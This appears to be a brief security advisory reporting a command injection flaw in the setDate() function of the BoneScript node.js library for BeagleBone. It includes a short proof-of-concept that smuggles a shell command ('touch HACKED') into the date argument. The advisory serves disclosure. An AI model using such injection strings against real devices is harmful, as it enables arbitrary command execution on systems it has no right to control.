# Overview
[BoneScript](https://github.com/jadonk/bonescript) is a node.js library for physical computing on embedded Linux, starting with support for BeagleBone.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in the `setDate()` function.

# Proof of Concept
```js
var b = require('bonescript');

b.setDate('"; touch HACKED; #//', function(error, resp){
    console.log(resp);
});
```
